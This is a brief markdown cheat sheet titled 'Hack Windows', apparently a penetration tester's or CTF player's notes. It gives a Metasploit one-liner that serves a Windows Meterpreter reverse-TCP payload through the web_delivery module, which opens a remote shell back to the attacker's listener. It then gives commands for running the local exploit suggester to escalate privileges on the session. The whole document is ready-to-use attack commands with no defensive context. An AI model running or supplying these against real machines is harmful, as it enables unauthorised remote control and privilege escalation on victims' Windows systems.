# Hack Windows

## Get Shell
```bash
msfconsole -q -x "use exploit/multi/script/web_delivery ; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST tun0 ; set LPORT 11443 ; set target 2 ; exploit -j"
```

## Privilege Escalation
```bash
use multi/recon/local_exploit_suggester
set session 1
run
```
